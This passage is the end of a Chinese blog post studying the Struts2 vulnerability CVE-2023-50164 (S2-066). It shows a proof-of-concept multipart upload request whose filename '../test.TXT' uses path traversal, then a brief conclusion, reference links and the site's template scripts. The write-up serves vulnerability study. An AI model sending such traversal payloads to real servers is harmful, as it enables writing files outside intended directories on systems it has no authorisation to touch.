+Cookie: JSESSIONID=E88CE6974708C3CF0F165E2AC2C36CC1
+Content-Length: 194
+
+------WebKitFormBoundary1QfPbi7wUsDuglB1
+Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;../test.TXT&quot;
+Content-Type: text/plain
+
+flag{test}
+------WebKitFormBoundary1QfPbi7wUsDuglB1--
+</code></pre>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>可以当作辅助工具使用，但是漏洞复现的时候，感觉还是要细读复现成功的师傅们的文章，并且自己动手尝试。</p>
+<hr>
+<p><a href="https://www.cnblogs.com/hubavyn/p/8087143.html" target="_blank" rel="noopener">https://www.cnblogs.com/hubavyn/p/8087143.html</a></p>
+<p><a href="https://www.freebuf.com/vuls/390624.html" target="_blank" rel="noopener">全网最详细的Struts2-066漏洞分析（CVE-2023-50164）</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Struts2/">Struts2</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2024/12/12/tai-e指针分析学习/">
+                        <span>tai-e指针分析学习(1)</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "CVE-2023-50164(S2-066)学习&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
